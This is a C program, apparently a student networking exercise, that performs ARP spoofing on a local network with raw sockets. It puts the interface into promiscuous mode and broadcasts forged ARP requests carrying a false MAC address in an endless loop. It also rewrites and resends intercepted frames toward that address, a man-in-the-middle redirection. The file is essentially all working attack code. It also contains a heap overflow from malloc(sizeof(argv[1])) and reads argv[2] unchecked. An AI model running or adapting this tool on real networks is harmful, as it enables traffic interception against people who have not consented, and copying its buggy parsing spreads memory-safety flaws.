#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <unistd.h>
#include "arp.h"

char false_mac[6];
char src_mac[6];
char bcast_mac[6] =	{0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

char src_ip[4] = {10,0,0,20};
uint8_t dst_ip[4] = {10,0,0,22};

union eth_buffer buffer_u;
union eth_buffer rcv_buffer_u;

int main(int argc, char *argv[])
{
	struct ifreq if_idx, if_mac, ifopts;
	char ifName[IFNAMSIZ];
	struct sockaddr_ll socket_address;
	int sockfd, numbytes;
	
	/* Get mac and ip from parameters */
	if (argc > 1) {
		
		/* Convert MAC String to Array */
		char* mac = (char *) malloc(sizeof(argv[1]));
		strcpy(mac, argv[1]);
		int mac_values[6];
		int i;

		if( 6 == sscanf( mac, "%x:%x:%x:%x:%x:%x%*c",
			&mac_values[0], &mac_values[1], &mac_values[2],
			&mac_values[3], &mac_values[4], &mac_values[5] ) ) {
			/* convert to uint8_t */
			for( i = 0; i < 6; i++ ) {
				false_mac[i] = (uint8_t) mac_values[i];
			}
		} else {
			printf("\nInvalid MAC Address\n");
			return 0;
		}
		
		/* Convert IP String to Array */
		char* ip = (char *) malloc(sizeof(argv[2]));
		strcpy(ip, argv[2]);
		int ip_values[4];
		
		if (4 == sscanf(ip, "%d.%d.%d.%d%*c",
			&ip_values[0], &ip_values[1], &ip_values[2],
			&ip_values[3])) {
			/* convert to uint8_t */
			for (i = 0; i < 4; ++i)
				dst_ip[i] = (uint8_t) ip_values[i];
		} else {
			printf("\nInvalid IP Address\n");
			return 0;
		}
	}
	
	printf("asiodisao");
	
	strcpy(ifName, DEFAULT_IF);

	/* Open RAW socket */
	if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1)
		perror("socket");
	
	/* Set interface to promiscuous mode */
	strncpy(ifopts.ifr_name, ifName, IFNAMSIZ-1);
	ioctl(sockfd, SIOCGIFFLAGS, &ifopts);
	ifopts.ifr_flags |= IFF_PROMISC;
	ioctl(sockfd, SIOCSIFFLAGS, &ifopts);

	/* Get the index of the interface */
	memset(&if_idx, 0, sizeof(struct ifreq));
	strncpy(if_idx.ifr_name, ifName, IFNAMSIZ-1);
	if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0)
		perror("SIOCGIFINDEX");
	socket_address.sll_ifindex = if_idx.ifr_ifindex;
	socket_address.sll_halen = ETH_ALEN;

	/* Get the MAC address of the interface */
	memset(&if_mac, 0, sizeof(struct ifreq));
	strncpy(if_mac.ifr_name, ifName, IFNAMSIZ-1);
	if (ioctl(sockfd, SIOCGIFHWADDR, &if_mac) < 0)
		perror("SIOCGIFHWADDR");	
	memcpy(src_mac, if_mac.ifr_hwaddr.sa_data, 6);
	    
	/* End of configuration. Now we can send and receive data using raw sockets. */


	/* To send data (in this case we will cook an ARP packet and broadcast it =])... */
	
	memcpy(src_mac, false_mac, 6);
	
	/* fill the Ethernet frame header */
	memcpy(buffer_u.cooked_data.ethernet.dst_addr, bcast_mac, 6);
	memcpy(buffer_u.cooked_data.ethernet.src_addr, src_mac, 6);
	buffer_u.cooked_data.ethernet.eth_type = htons(ETH_P_ARP);

	/* fill payload data (incomplete ARP request example) */
	buffer_u.cooked_data.payload.arp.hw_type = htons(1);
	buffer_u.cooked_data.payload.arp.prot_type = htons(ETH_P_IP);
	buffer_u.cooked_data.payload.arp.hlen = 6;
	buffer_u.cooked_data.payload.arp.plen = 4;
	buffer_u.cooked_data.payload.arp.operation = htons(1);
	//MAC Source
	memcpy(buffer_u.cooked_data.payload.arp.src_hwaddr, src_mac, 6);
	//MAC Destination
	memset(buffer_u.cooked_data.payload.arp.tgt_hwaddr, 0, 6);
	//IP Source
	memcpy(buffer_u.cooked_data.payload.arp.src_paddr, src_ip, 4);
	//IP Destination
	memcpy(buffer_u.cooked_data.payload.arp.tgt_paddr, dst_ip, 4);

	/* Send it.. */
	while(1) {
	memcpy(socket_address.sll_addr, bcast_mac, 6);
		if (sendto(sockfd, buffer_u.raw_data, sizeof(struct eth_hdr) + sizeof(struct arp_packet), 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
			printf("Request send failed\n");
			
		numbytes = recvfrom(sockfd, rcv_buffer_u.raw_data, ETH_LEN, 0, NULL, NULL);
		if (numbytes > 0) {
			if (rcv_buffer_u.cooked_data.ethernet.eth_type != ntohs(ETH_P_ARP)){
				uint8_t *e_destinationMAC = rcv_buffer_u.cooked_data.ethernet.dst_addr;
				for(int i = 0; i < 6; i++) {
					if (e_destinationMAC[i] != src_mac[i]) {
						memcpy(rcv_buffer_u.cooked_data.ethernet.dst_addr, false_mac, 6);
						printf("Reenviei umas paradas\n");
						if (sendto(sockfd, rcv_buffer_u.raw_data, sizeof(struct eth_hdr) + sizeof(struct arp_packet), 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
							printf("Redirecting failed\n");
					}
				}
			}
		}
					
		sleep(1);
	}
}	
